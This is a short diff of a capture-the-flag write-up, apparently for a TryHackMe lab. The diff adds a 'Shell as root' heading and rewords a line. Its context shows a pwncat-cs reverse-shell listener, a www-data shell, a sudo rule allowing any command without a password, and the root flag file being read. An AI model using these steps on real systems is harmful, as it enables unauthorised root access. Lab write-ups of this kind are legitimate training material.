@@ -499,6 +499,9 @@ sh3bu@Ubuntu:~/thm/whyhackme$ pwncat-cs -lp 8888
 (remote) www-data@ubuntu:/usr/lib/cgi-bin$ id
 uid=33(www-data) gid=1003(h4ck3d) groups=1003(h4ck3d)
 ```
+
+## Shell as root 
+
 The `www-data` user had the privilege to run any command as any user!
 ```bash
 (remote) www-data@ubuntu:/usr/lib/cgi-bin$ sudo -l
@@ -509,7 +512,7 @@ User www-data may run the following commands on ubuntu:
     (ALL : ALL) NOPASSWD: ALL
 ```
 
-Now we can easily grab the **root.txt** 🚩.
+So we can now easily grab the **root.txt** 🚩.
 ```
 (remote) www-data@ubuntu:/usr/lib/cgi-bin$ sudo wc -c /root/root.txt
 33 /root/root.txt
